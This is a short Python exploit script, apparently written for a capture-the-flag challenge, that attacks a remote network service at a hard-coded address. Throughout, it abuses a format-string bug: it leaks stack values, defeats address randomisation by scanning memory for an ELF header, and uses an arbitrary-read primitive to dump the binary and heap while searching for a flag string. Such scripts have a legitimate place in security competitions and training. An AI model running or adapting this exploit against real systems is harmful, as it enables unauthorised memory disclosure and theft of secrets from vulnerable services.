#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.02)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    for _ in range(5):
        d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
        if m: return int(m.group(1))
        time.sleep(0.1)
    return None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    for _ in range(6):
        a15=leak_lld(s,15)
        if a15:
            start=a15&~0xfff
            for d in range(0,0x20000,0x1000):
                r=readmem(s,start-d)
                if r.startswith(b'\x7fELF'): return start-d
    return None

def fresh():
    s=newconn()
    pie=get_pie(s)
    return s, pie

s, pie = fresh()
print("pie=",hex(pie))
found=[]
# binary data scan, fixed step 0x100, reconnect keeps pie (new each conn)
rel=0x2000
while rel<0x8000:
    X=pie+rel
    r=readmem(s,X)
    if b'PTITCTF' in r or b'2026' in r or (b'{' in r and b'}' in r):
        print("BIN",hex(X),repr(r[:200])); found.append(X)
    if r==b'' or r==b'<T':
        try: s.close()
        except: pass
        s,pie = fresh()
    else:
        rel+=0x100
print("bin done, found",len(found))
# heap scan
s,pie=fresh()
a14=leak_lld(s,14)
print("heap=",hex(a14))
if a14:
    rel=0
    while rel<0x30000:
        r=readmem(s,a14+rel)
        if b'PTITCTF' in r or b'2026' in r or (b'{' in r and b'}' in r):
            print("HEAP",hex(a14+rel),repr(r[:200])); found.append(a14+rel)
        if r==b'' or r==b'<T':
            try: s.close()
            except: pass
            s,pie=fresh(); a14=leak_lld(s,14)
            if not a14: break
        else:
            rel+=0x200
print("heap done, total found",len(found))
try: s.close()
except: pass
